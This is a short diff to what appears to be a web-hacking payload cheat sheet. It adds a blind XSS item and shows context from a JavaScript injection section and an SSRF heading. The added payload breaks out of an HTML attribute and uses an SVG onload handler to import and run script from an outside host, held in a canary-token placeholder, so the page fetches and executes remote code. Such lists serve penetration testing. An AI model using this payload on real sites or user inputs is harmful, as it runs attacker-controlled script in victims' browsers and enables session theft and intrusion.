@@ -158,6 +158,10 @@ Quoteless JSi
 ```
 /confirm?.(1)//\
 ```
+14-blind xss
+```
+-'"><Svg Src=//{CANARY_TOKEN}/s OnLoad=import(this.getAttribute('src')+0)>
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
